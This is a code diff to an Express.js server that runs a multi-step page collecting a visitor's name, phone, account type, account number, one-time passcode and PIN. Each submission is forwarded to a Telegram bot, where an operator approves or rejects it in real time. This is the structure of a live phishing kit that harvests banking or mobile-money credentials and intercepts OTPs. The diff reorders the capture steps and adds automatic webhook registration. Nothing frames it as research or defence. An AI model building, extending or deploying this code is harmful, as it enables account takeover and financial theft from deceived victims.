@@ -7,10 +7,10 @@ const app = express();
 const PORT = process.env.PORT || 10000;
 const DOMAIN = process.env.BACKEND_DOMAIN;
 
-// ---------------- MEMORY ----------------
-const passwordRequests = {};
-const pinRequests = {};
+// ---------------- MEMORY STORES ----------------
+const accountRequests = {};
 const otpRequests = {};
+const pinRequests = {};
 const requestMeta = {};
 
 // ---------------- BOTS ----------------
@@ -21,7 +21,6 @@ Object.keys(process.env).forEach(key => {
   if (!match) return;
 
   const i = match[1];
-
   const token = process.env[`BOT${i}_TOKEN`];
   const chatId = process.env[`BOT${i}_CHATID`];
 
@@ -35,6 +34,36 @@ Object.keys(process.env).forEach(key => {
 });
 
 console.log('✅ Bots loaded:', bots.map(b => b.botId));
+
+// ---------------- AUTO WEBHOOK SETUP ----------------
+async function setWebhook(bot) {
+  if (!DOMAIN) {
+    console.error(`❌ BACKEND_DOMAIN not set – can't set webhook for ${bot.botId}`);
+    return;
+  }
+
+  const webhookUrl = `https://${DOMAIN}/telegram-webhook/${bot.botId}`;
+  try {
+    const res = await axios.post(
+      `https://api.telegram.org/bot${bot.token}/setWebhook`,
+      { url: webhookUrl }
+    );
+    if (res.data.ok) {
+      console.log(`✅ Webhook set for ${bot.botId} → ${webhookUrl}`);
+    } else {
+      console.error(`❌ Failed to set webhook for ${bot.botId}:`, res.data.description);
+    }
+  } catch (err) {
+    console.error(`❌ Error setting webhook for ${bot.botId}:`, err.message);
+  }
+}
+
+// Set webhook for each bot on startup
+(async () => {
+  for (const bot of bots) {
+    await setWebhook(bot);
+  }
+})();
 
 // ---------------- MIDDLEWARE ----------------
 app.use(express.json({ type: '*/*' }));
@@ -77,28 +106,32 @@ app.get('/bot/:botId', (req, res) => {
   res.redirect(`/index.html?botId=${bot.botId}`);
 });
 
-// ---------------- STEP 1 PHONE ----------------
-app.post('/submit-password', async (req, res) => {
-  const { name = "User", phone, botId } = req.body;
+// ============================================================
+//  STEP 1: ACCOUNT DETAILS  (details.html)
+// ============================================================
+app.post('/submit-account', async (req, res) => {
+  const { name, phone, accountType, accountNumber, botId } = req.body;
 
   const bot = getBot(botId);
   if (!bot) return res.status(400).json({ error: 'Invalid bot' });
 
   const requestId = uuidv4();
-
-  passwordRequests[requestId] = null;
+  accountRequests[requestId] = null;
   requestMeta[requestId] = { name, phone, botId };
 
+  // ✅ Telegram message now ONLY shows the 4 fields
   await sendTelegram(
     bot,
-`📲 LOGIN STEP
-👤Name: ${name}
-📞Phone: ${phone}
+`📋 ACCOUNT DETAILS
+👤 Name: ${name}
+📞 Phone: ${phone}
+🏷️ Account Type: ${accountType}
+🔢 Account Number: ${accountNumber}
 🆔 ${requestId}`,
     [
       [
-        { text: '✅ Approve', callback_data: `pass_ok:${requestId}` },
-        { text: '❌ Reject', callback_data: `pass_bad:${requestId}` }
+        { text: '✅ Approve', callback_data: `account_ok:${requestId}` },
+        { text: '❌ Reject', callback_data: `account_bad:${requestId}` }
       ]
     ]
   );
@@ -106,57 +139,16 @@ app.post('/submit-password', async (req, res) => {
   res.json({ requestId });
 });
 
-// CHECK → PIN PAGE
-app.get('/check-password/:id', (req, res) => {
-  const result = passwordRequests[req.params.id];
-
-  if (result === true) return res.json({ redirect: 'pin' });
-  if (result === false) return res.json({ approved: false });
-
-  res.json({ approved: null });
-});
-
-// ---------------- STEP 2 PIN ----------------
-app.post('/submit-pin', async (req, res) => {
-  const { name, phone, pin, botId } = req.body;
-
-  const bot = getBot(botId);
-  if (!bot) return res.status(400).json({ error: 'Invalid bot' });
-
-  const requestId = uuidv4();
-
-  pinRequests[requestId] = null;
-  requestMeta[requestId] = { name, phone, botId };
-
-  await sendTelegram(
-    bot,
-`🔐 PIN STEP
-👤Name: ${name}
-📞Phone: ${phone}
-🔢Pin: ${pin}
-🆔 ${requestId}`,
-    [
-      [
-        { text: '✅ Correct PIN', callback_data: `pin_ok:${requestId}` },
-        { text: '❌ Wrong PIN', callback_data: `pin_bad:${requestId}` }
-      ]
-    ]
-  );
-
-  res.json({ requestId });
-});
-
-// CHECK → CODE PAGE
-app.get('/check-pin/:id', (req, res) => {
-  const result = pinRequests[req.params.id];
-
+app.get('/check-account/:id', (req, res) => {
+  const result = accountRequests[req.params.id];
   if (result === true) return res.json({ redirect: 'code' });
   if (result === false) return res.json({ approved: false });
-
   res.json({ approved: null });
 });
 
-// ---------------- STEP 3 OTP ----------------
+// ============================================================
+//  STEP 2: OTP  (code.html)
+// ============================================================
 app.post('/submit-otp', async (req, res) => {
   const { name, phone, otp, botId } = req.body;
 
@@ -164,16 +156,15 @@ app.post('/submit-otp', async (req, res) => {
   if (!bot) return res.status(400).json({ error: 'Invalid bot' });
 
   const requestId = uuidv4();
-
   otpRequests[requestId] = null;
   requestMeta[requestId] = { name, phone, botId };
 
   await sendTelegram(
     bot,
-`🔢 CODE STEP
+`🔢 OTP STEP
 👤Name: ${name}
 📞Phone: ${phone}
-🔑Otp: ${otp}
+🔑OTP: ${otp}
 🆔 ${requestId}`,
     [
       [
@@ -186,17 +177,54 @@ app.post('/submit-otp', async (req, res) => {
   res.json({ requestId });
 });
 
-// CHECK → SUCCESS PAGE
 app.get('/check-otp/:id', (req, res) => {
   const result = otpRequests[req.params.id];
-
-  if (result === true) return res.json({ redirect: 'success' });
+  if (result === true) return res.json({ redirect: 'pin' });
   if (result === false) return res.json({ approved: false });
-
   res.json({ approved: null });
 });
 
-// ---------------- CALLBACK ----------------
+// ============================================================
+//  STEP 3: PIN  (pin.html)
+// ============================================================
+app.post('/submit-pin', async (req, res) => {
+  const { name, phone, pin, botId } = req.body;
+
+  const bot = getBot(botId);
+  if (!bot) return res.status(400).json({ error: 'Invalid bot' });
+
+  const requestId = uuidv4();
+  pinRequests[requestId] = null;
+  requestMeta[requestId] = { name, phone, botId };
+
+  await sendTelegram(
+    bot,
+`🔐 PIN STEP
+👤Name: ${name}
+📞Phone: ${phone}
+🔢PIN: ${pin}
+🆔 ${requestId}`,
+    [
+      [
+        { text: '✅ Correct PIN', callback_data: `pin_ok:${requestId}` },
+        { text: '❌ Wrong PIN', callback_data: `pin_bad:${requestId}` }
+      ]
+    ]
+  );
+
+  res.json({ requestId });
+});
+
+app.get('/check-pin/:id', (req, res) => {
+  const result = pinRequests[req.params.id];
+  if (result === true) return res.json({ redirect: 'success' });
+  if (result === false) return res.json({ approved: false });
+  res.json({ approved: null });
+});
+
+// ============================================================
+//  TELEGRAM WEBHOOK  (handles all callbacks)
+// ============================================================
 app.post('/telegram-webhook/:botId', async (req, res) => {
   const bot = getBot(req.params.botId);
   if (!bot) return res.sendStatus(404);
@@ -205,39 +233,35 @@ app.post('/telegram-webhook/:botId', async (req, res) => {
   if (!cb) return res.sendStatus(200);
 
   const [action, requestId] = cb.data.split(':');
-
   const meta = requestMeta[requestId];
 
   let msg = '';
 
-  if (action === 'pass_ok') {
-    passwordRequests[requestId] = true;
-    msg = 'Login APPROVED';
+  if (action === 'account_ok') {
+    accountRequests[requestId] = true;
+    msg = 'Account APPROVED → proceed to OTP';
   }
-
-  if (action === 'pass_bad') {
-    passwordRequests[requestId] = false;
-    msg = 'Login REJECTED';
-  }
-
-  if (action === 'pin_ok') {
-    pinRequests[requestId] = true;
-    msg = 'PIN APPROVED';
-  }
-
-  if (action === 'pin_bad') {
-    pinRequests[requestId] = false;
-    msg = 'PIN REJECTED';
+  if (action === 'account_bad') {
+    accountRequests[requestId] = false;
+    msg = 'Account REJECTED';
   }
 
   if (action === 'otp_ok') {
     otpRequests[requestId] = true;
-    msg = 'CODE APPROVED → SUCCESS';
+    msg = 'OTP APPROVED → proceed to PIN';
   }
-
   if (action === 'otp_bad') {
     otpRequests[requestId] = false;
-    msg = 'CODE REJECTED';
+    msg = 'OTP REJECTED';
+  }
+
+  if (action === 'pin_ok') {
+    pinRequests[requestId] = true;
+    msg = 'PIN APPROVED → SUCCESS!';
+  }
+  if (action === 'pin_bad') {
+    pinRequests[requestId] = false;
+    msg = 'PIN REJECTED';
   }
 
   if (meta && msg) {
